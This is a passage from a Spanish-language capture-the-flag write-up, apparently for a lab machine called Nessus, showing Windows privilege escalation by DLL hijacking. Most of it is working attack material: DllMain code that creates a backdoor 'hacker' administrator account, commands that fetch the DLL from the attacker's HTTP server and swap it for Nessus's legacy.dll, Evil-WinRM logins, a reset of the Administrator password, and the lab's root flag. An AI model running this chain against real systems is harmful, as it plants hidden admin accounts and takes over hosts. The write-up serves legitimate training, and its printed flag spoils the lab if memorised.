        system("net user hacker hacker /add"); // Crea el usuario 'hacker' con la contraseña 'hacker'
        system("net localgroup administrators hacker /add"); // Añade el usuario 'hacker' al grupo 'Administrators'
        system("net localgroup 'Remote Management Users' hacker /add"); // Añade al grupo 'Remote Management Users'
        system("net localgroup 'Remote Desktop Users' hacker /add"); // Añade al grupo 'Remote Desktop Users'
        break;
    case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
    case DLL_THREAD_DETACH: // A thread exits normally.
        break;
    case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Ahora vamos a movernos a la carpeta:

```powershell
cd "C:\Program Files\Tenable\Nessus\"
```

Y nos lo pasaremos de la siguiente forma abriendo un servidor de `python3`:

```shell
python3 -m http.server 8000
```

En la maquina victima:

```powershell
Invoke-WebRequest -Uri "http://<IP>:8000/malicious.dll" -OutFile "C:\Program Files\Tenable\Nessus\malicious.dll"
```

Con esto ya tendremos el `.dll` en la carpeta de `Nessus`, ahora solo tendremos que cambiar el nombre de una de las `.dll` originales por la maliciosa de la siguiente forma:

```powershell
mv legacy.dll legacy_old.dll; mv malicious.dll legacy.dll
```

Ahora si reiniciamos la maquina y probamos a entrar con el usuario que se supone que se ha tenido que crear llamado `hacker` veremos lo siguiente:

```shell
evil-winrm -i <IP> -u hacker -p 'hacker'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\hacker\Documents> whoami
nessus\hacker
```

Vemos que ha funcionado, pero si listamos los permisos y privilegios que tenemos:

```powershell
whoami /all
```

Info:

```
USER INFORMATION
----------------

User Name     SID
============= ============================================
nessus\hacker S-1-5-21-2986980474-46765180-2505414164-1003


GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                                          Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

Vemos que tenemos todo, incluido que estamos en el grupo `Administradores` por lo que podremos cambiar la contraseña al propio `Administrador` de la siguiente forma:

```powershell
net user Administrator Password-
```

Info:

```
The command completed successfully.
```

Ahora si probamos a meternos con dicha cuenta y dicha contraseña:

```shell
evil-winrm -i <IP> -u Administrator -p 'Password-'
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
nessus\administrator
```

Veremos que ha funcionado, por lo que leeremos la flag del `admin`.

> root.txt

```
b5fc5a4ebfc20cc18220a814e1aee0aa
```
